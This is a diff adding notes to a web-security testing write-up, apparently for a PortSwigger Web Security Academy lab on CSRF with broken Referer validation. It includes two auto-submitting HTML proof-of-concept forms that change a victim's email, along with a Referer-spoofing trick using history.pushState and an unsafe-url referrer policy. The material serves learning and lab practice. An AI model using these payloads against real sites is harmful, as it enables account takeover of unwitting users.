@@ -237,6 +237,70 @@ Will not include refer tag
     </body>
 </html>
 ```
+**CSRF with broken Referer validation**
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/eb677696-825d-43e5-b655-7a311ce020c3)
+
+
+
+
+
+
+
+```
+<html>
+    <body>
+    <script> history.pushState(' ',' ', '/')</script>
+    <form action="https://0af6002b044ec32084de63e900bb0053.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="vffasf@gmail.com"/>
+        <input type="submit" value="submit request"/>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+    </body>
+</html>
+```
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/6216ab1e-e691-4acd-877e-3ec41415ea40)
+
+
+
+Deleting refer header give us a 400 bad request
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/68876865-5dc5-4983-af52-f71c09dadf27)
+
+
+Testing refer header
+```
+1. Removing the refer header: give us a invalid referer header 
+2. Check which portion of the referrer header is the application validating
+``` 
+	
+	
+Check by changing domain that you control
+![image](https://github.com/VietTheBarbarian/Manual-Application-Testing/assets/56415307/a3d40376-4f04-4d31-bfb7-21d00c0e0e90)
+
+
+Condition 2 met
+Used history.pushState third parameter
+
+Changed: Added so that the third parameter in our history.pushState wont be stripped
+Referrer-Policy: unsafe-url 
+
+POC
+
+```
+<html>
+    <body>
+    <script> history.pushState(' ',' ', '/?0a6b009e043ef2ae81f55cc90042008a.web-security-academy.net')</script>
+    <form action="https://0a6b009e043ef2ae81f55cc90042008a.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="vffasf@gmail.com"/>
+        <input type="submit" value="submit request"/>
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+    </body>
+</html>
+```
 
 
 
